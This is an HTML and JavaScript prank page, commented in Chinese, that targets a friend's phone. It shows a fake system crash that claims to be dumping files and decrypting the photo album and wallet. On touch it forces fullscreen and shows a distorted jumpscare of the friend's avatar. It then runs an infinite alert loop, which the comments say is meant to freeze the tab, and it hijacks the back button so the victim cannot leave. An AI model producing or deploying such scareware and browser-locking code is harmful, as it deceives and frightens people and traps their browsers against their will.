<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CRITICAL_SYSTEM_HALT</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none; /* 禁用长按选择，防止露馅 */
            -webkit-touch-callout: none;
        }

        body {
            background-color: #000000;
            color: #ff2222;
            font-family: monospace, sans-serif;
            height: 100vh;
            width: 100vw;
            overflow: hidden;
            position: fixed; /* 锁定视口，防止手机端橡皮筋下拉刷新效果 */
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* 阶段 1：底层崩溃伪装 */
        #stage-1 {
            width: 90%;
            font-size: 0.8rem;
            line-height: 1.6;
            color: #777;
        }

        /* 阶段 2：全屏惊悚爆发（初始隐藏） */
        #stage-2 {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            background: #000000;
            z-index: 9999;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .avatar-jumpscare {
            width: 75vw;
            height: 75vw;
            max-width: 300px;
            max-height: 300px;
            border: 2px solid #ff0000;
            background-image: url('friend_avatar.jpg'); /* 你的朋友头像 */
            background-size: cover;
            background-position: center;
            filter: grayscale(1) contrast(2.5) brightness(0.5) sepia(0.4) hue-rotate(-30deg);
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.5);
            margin-bottom: 40px;
        }

        .critical-message {
            font-size: 1.1rem;
            color: #ff0000;
            text-align: center;
            font-weight: bold;
            line-height: 1.8;
            letter-spacing: 2px;
        }
    </style>
</head>
<body>

    <div id="stage-1">
        <div>[CRITICAL_ERR] ACCESS_VIOLATION_0x0029F1A</div>
        <div style="color: #ff1111; margin: 10px 0; font-weight: bold;">>>> PHONE_STORAGE_MEM_OVERFLOW // 硬件底层致命冲突</div>
        <div style="color: #444; font-size: 0.75rem;">
            鎹掓湰鏈烘暟鎹... [DUMPING_LOCAL_FILES]<br>
            正在强行解密相册与社交钱包... 89%<br>
            [警告] 触控芯片已被强行锁定，点击屏幕重置硬件。
        </div>
    </div>

    <div id="stage-2">
        <div class="avatar-jumpscare"></div>
        <div class="critical-message">
            CORE_SYSTEM_DESTROYED.<br>
            <span style="font-size: 0.75rem; color: #444; font-weight: normal; display:block; margin-top:10px;">
                [ 硬件中断：触控层与电源管理层已失效 ]
            </span>
        </div>
    </div>

    <script>
        const stage1 = document.getElementById('stage-1');
        const stage2 = document.getElementById('stage-2');

        // 1. 强制全屏劫持层
        const triggerArea = document.createElement('div');
        triggerArea.style.position = 'fixed';
        triggerArea.style.top = '0'; triggerArea.style.left = '0';
        triggerArea.style.width = '100vw'; triggerArea.style.height = '100vh';
        triggerArea.style.zIndex = '999';
        document.body.appendChild(triggerArea);

        const lockAndDestroy = (e) => {
            e.preventDefault();
            
            // 尝试触发全屏（部分手机浏览器支持）
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            } else if (document.documentElement.webkitRequestFullscreen) {
                document.documentElement.webkitRequestFullscreen();
            }

            stage1.style.display = 'none';
            stage2.style.display = 'flex';

            // 2. 核心手机整蛊逻辑：无限弹窗循环（锁死浏览器）
            // 当他进入第二阶段后，只要稍微碰一下屏幕想划走，就会疯狂触发这个无限弹窗，直接卡死他的当前网页标签页
            setTimeout(() => {
                while(true) {
                    alert("【⚠️ 致命错误】当前物理终端已彻底损坏。");
                }
            }, 500);
        };

        // 绑定触摸和点击事件，确保在手机上绝对触发
        triggerArea.addEventListener('touchstart', lockAndDestroy, { passive: false });
        triggerArea.addEventListener('click', lockAndDestroy);

        // 3. 拦截手机浏览器的“后退”历史记录
        // 如果他用自带浏览器的后退键，会被强制留在当前页
        window.history.pushState(null, null, window.location.href);
        window.addEventListener('popstate', function () {
            window.history.pushState(null, null, window.location.href);
            alert("【⚠️ 错误】无法执行回退：底层数据链已断开。");
        });
    </script>

</body>
</html>
